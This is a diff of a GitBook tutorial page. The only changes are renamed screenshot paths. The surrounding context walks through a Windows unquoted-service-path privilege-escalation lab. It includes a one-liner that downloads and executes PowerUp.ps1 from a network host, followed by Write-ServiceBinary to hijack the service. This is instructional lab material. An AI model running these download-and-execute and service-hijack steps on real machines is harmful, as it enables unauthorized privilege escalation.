@@ -19,7 +19,7 @@ description: >-
 sc.exe create "Service" binpath= "C:\Program Files\bin folder\program\bin x64\Service.exe" start= auto
 ```
 
-![](<../../../.gitbook/assets/image (11) (1) (1).png>)
+![](<../../../.gitbook/assets/image (11) (1) (1) (1).png>)
 
 3\. Run the following command to create the folders for the service:
 
@@ -27,7 +27,7 @@ sc.exe create "Service" binpath= "C:\Program Files\bin folder\program\bin x64\Se
 mkdir "C:\Program Files\bin folder\program\bin x64"
 ```
 
-![](<../../../.gitbook/assets/image (10) (1) (2) (1) (1).png>)
+![](<../../../.gitbook/assets/image (10) (1) (2) (1) (1) (1).png>)
 
 4\. Run icacls to check the current permissions on the directories with a space in it:
 
@@ -108,7 +108,7 @@ iex (iwr http://192.168.248.2:8090/PowerUp.ps1 -usebasicparsing)
 
 4\. Execute `Invoke-AllChecks` to run all the checks from `PowerUp`.
 
-![](<../../../.gitbook/assets/image (23) (1) (1) (1).png>)
+![](<../../../.gitbook/assets/image (23) (1) (1) (1) (1).png>)
 
 5\. The output tells us there is a service with the name `Service` and it has a **unqouted** service path (`C:\Program Files\bin folder\program\bin x64\service.exe`).
 
@@ -145,7 +145,7 @@ Write-ServiceBinary -ServiceName 'Service' -ServicePath 'C:\Program Files\bin fo
 
 ![](<../../../.gitbook/assets/image (47) (1) (1) (1) (1).png>)
 
-![](<../../../.gitbook/assets/image (39) (1) (1) (1) (1).png>)
+![](<../../../.gitbook/assets/image (39) (1) (1) (1) (1) (1).png>)
 
 #### Cleanup
 
